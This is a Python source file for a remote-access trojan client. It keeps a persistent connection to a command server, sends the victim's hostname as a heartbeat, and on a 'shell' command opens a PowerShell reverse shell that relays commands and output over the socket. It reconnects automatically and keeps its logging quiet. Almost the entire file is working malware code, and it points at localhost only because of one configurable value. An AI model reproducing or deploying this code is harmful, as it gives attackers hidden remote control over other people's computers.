from utils import *
import logging
from socket import socket, gethostname, AF_INET, SOCK_STREAM
from threading import Thread
from time import sleep
from subprocess import Popen, PIPE, STDOUT

logging.basicConfig(level=logging.CRITICAL)


class Trojan:
    def __init__(self, server_ip, server_port):
        self.server_addr = (server_ip, server_port)
        self.skt = socket()
        self.error = bool()
        logging.debug(f'trojan info\n'
                      f'server ip: {server_ip}\n'
                      f'server port: {server_port}')

    def run(self):
        @IgnoreSE
        def func():
            # reset signals
            self.error = False
            # reset socket
            self.skt = socket(AF_INET, SOCK_STREAM)
            self.skt.connect(self.server_addr)
            # restart threads
            threads = [
                Thread(target=self._heartbeat),
                Thread(target=self._listen_cmd)
            ]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
                self.error = True

        while True:
            func()
            logging.debug('restarting trojan')
            sleep(5)

    @IgnoreSE
    def _listen_cmd(self):
        while self.error is not True:
            cmd = recv_with_header(self.skt, Header.control)
            if cmd == 'shell':
                t = Thread(target=self._reverse_shell)
                t.start()
                t.join()

    @IgnoreSE
    def _heartbeat(self):
        logging.debug('heartbeat activated')
        name = gethostname()
        while self.error is not True:
            send_with_header(self.skt, Header.heartbeat, name)
            sleep(2)
        logging.debug('heartbeat terminated')

    def _reverse_shell(self):
        logging.debug('shell reversed')
        proc = Popen(
                ["powershell.exe"],
                stdout=PIPE,
                stderr=STDOUT,
                stdin=PIPE,
                shell=True,
                text=True
        )
        logging.debug(f'shell pid: {proc.pid}')

        @IgnoreSE
        def s2p():
            while self.error is not True:
                data = recv_with_header(self.skt, Header.shell)
                if len(data) > 0:
                    proc.stdin.write(f'{data}\n')
                    proc.stdin.flush()

        @IgnoreSE
        def p2s():
            while self.error is not True:
                data = proc.stdout.readline()
                if len(data) > 0:
                    send_with_header(self.skt, Header.shell, data)

        threads = [
            Thread(target=s2p, daemon=True),
            Thread(target=p2s, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
            self.error = True
            proc.terminate()
            logging.debug('shell terminated')
            return


if __name__ == '__main__':
    trojan = Trojan(
            server_ip='localhost',
            server_port=36555
    )
    trojan.run()
